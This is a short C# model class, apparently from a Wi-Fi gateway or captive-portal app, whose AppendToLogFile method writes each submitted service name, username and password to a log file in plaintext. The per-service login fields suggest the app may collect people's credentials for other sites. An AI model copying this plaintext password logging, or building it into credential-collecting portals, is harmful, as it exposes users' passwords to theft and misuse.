using System;
using System.Collections.Generic;
using System.ComponentModel.DataAnnotations;
using System.Linq;
using System.Threading.Tasks;
using System.IO;

namespace WifiGate.Models {
    public class LoginModel {

        public string Service { get; set; }

        public string ServiceName { get; set; }

        [Required]
        public string UserName { get; set; }

        [Required]
        public string Password { get; set; }

        public void AppendToLogFile(string fileName) {
            var line = string.Join("\t", this.Service, this.UserName, this.Password) + "\r\n";
            File.AppendAllText(fileName, line);
        }

    }
}
